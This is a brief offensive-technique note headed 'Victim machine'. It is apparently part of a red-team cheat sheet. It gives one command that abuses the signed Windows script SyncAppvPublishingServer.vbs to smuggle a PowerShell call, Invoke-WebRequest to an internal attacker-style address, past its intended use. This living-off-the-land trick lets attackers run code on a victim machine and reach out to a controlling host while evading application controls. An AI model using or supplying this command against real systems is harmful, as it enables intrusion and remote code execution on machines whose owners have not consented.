# Victim machine
- Run powershell script by abusing SyncAppvPublishingServer
```bash
SyncAppvPublishingServer.vbs "Break; iwr http://10.0.0.5:443"
```